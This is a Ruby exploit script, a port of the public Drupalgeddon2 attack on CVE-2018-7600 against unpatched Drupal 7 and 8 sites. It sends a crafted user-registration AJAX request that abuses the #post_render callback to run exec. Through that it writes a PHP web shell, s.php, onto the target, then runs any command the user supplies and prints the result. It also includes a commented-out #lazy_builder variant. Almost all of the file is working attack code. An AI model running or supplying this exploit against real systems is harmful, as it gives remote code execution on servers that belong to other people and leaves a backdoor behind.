#!/usr/bin/env ruby
#
# Hans Topo & g0tmi1k's ruby port of Drupalggedon2 exploit ~ https://github.com/dreadlocked/Drupalgeddon2/   (EDBID: 44449 ~ https://www.exploit-db.com/exploits/44449/)
# Based on Vitalii Rudnykh exploit ~ https://github.com/a2u/CVE-2018-7600   (EDBID: 44448 ~ https://www.exploit-db.com/exploits/44448/)
# Hans Topo ~ https://github.com/dreadlocked
# g0tmi1k ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#
# Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002
# Vulnerable Versions:
#          < 7.58
#    8.x   < 8.3.9
#    8.4.x < 8.4.6   (TESTED)
#    8.5.x < 8.5.1   (TESTED)
#
# WriteUp & Thx ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
# REF phpinfo() ~ https://twitter.com/i_bo0om/status/984674893768921089                   (curl - user/register - mail - #post_render)
# REF phpinfo() ~ https://twitter.com/RicterZ/status/984495201354854401                   (burp - user/<id>/edit [requires auth] - mail - #lazy_builder)
# REF 2x RCE    ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708        (curl - user/register - mail & timezone - #lazy_builder & #post_render)
# REF RCE       ~ https://gist.github.com/AlbinoDrought/626c07ee96bae21cb174003c9c710384  (curl - user/register - mail - #post_render)
# REF rev_nc    ~ https://gist.github.com/AlbinoDrought/2854ca1b2a9a4f33ca87581cf1e1fdd4  (curl - user/register - mail - #post_render)
# Collection    ~ https://github.com/g0rx/CVE-2018-7600-Drupal-RCE
#
#
# Drupal Version ~ https://example.com/CHANGELOG.txt
#


require 'base64'
require 'json'
require 'net/http'
require 'openssl'


# Proxy information (nil to disable)
proxy_addr = nil
proxy_port = 8080


# Quick how to use
if ARGV.empty?
  puts "Usage: ruby drupalggedon2.rb <target> <command>"
  puts "       ruby drupalgeddon2.rb https://example.com whoami"
  exit
end

# Read in values
target = ARGV[0]
command = ARGV[1]


# Banner
puts "[*] --==[::#Drupalggedon2::]==--"
puts "-"*80


# Check input for protocol
if not target.start_with?('http')
  target = "http://" + target
end

# Check input for the end
if not target.end_with?('/')
  target += "/"
end


# Payload
#evil = 'uname -a'
evil = '<?php system($_GET["c"]); ?>'
evil = "echo " + Base64.encode64(evil).strip + " | base64 -d | tee s.php"


# PHP function to use
phpmethod = 'exec'


# Feedback
puts "[*] Target : " + target
puts "[*] Command: " + command
puts "[*] PHP cmd: " + phpmethod


# Method #1 - timezone & lazy_builder - response is 500 & blind    (will need to disable target check for this to work!)
#url = target + 'user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
# Vulnerable Parameters: access_callback / lazy_builder  / pre_render/ post_render
#payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil


# Method #2 - mail & post_render - response is 200
url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
# Vulnerable Parameters: access_callback / lazy_builder  / pre_render/ post_render
payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil


uri = URI(url)
http = Net::HTTP.new(uri.host, uri.port, proxy_addr, proxy_port)

# Use SSL/TLS if needed
if uri.scheme == 'https'
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

# Make the request
req = Net::HTTP::Post.new(uri.request_uri)
req.body = payload

# Feedback
puts "[*] Payload: " + evil
#puts "[*] Sending: " + payload
puts "-"*80


# Check response
response = http.request(req)
if response.code == "200"
  puts "[+] Target seems to be exploitable! w00hooOO!"
  puts "[+] Result: " + JSON.pretty_generate(JSON[response.body] )
else
  puts "[!] Target does NOT seem to be exploitable ~ Response: " + response.code
  #exit
end


# Feedback
puts "-"*80
puts "[*]   curl '" + target + "s.php?c=#{command}'"
puts "-"*80

# Now run our command
exploit_uri = URI(target + "s.php?c=#{command}")

# Check response
response = Net::HTTP.get_response(exploit_uri)
if response.code != "200"
  puts "[!] Exploit FAILED ~ Response: " + response.code
  exit
end


# Result
puts "[+] Output: " + response.body